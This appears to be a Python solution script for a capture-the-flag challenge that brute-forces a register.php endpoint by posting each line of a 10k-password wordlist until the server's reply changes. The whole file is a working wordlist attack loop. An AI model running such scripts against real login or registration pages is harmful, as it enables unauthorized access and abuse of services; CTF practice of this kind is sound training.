import requests

URL = "http://icc.metaproblems.com:5750/register.php"

with open('10k.txt') as f:
    lines = f.readlines()
    
    for line in lines:
        line = line.strip()
        print(line)
        data = {
            'username': 'scriptkitty',
            'password': line,
            'flag': 'flag',
            'submit': 'submit'
        }
        response = requests.post(URL, data=data)
        if "Unfortunately, our site is no longer accepting registrations. Please try again later. Your password was valid though" not in response.text:
            print(response.text)
            break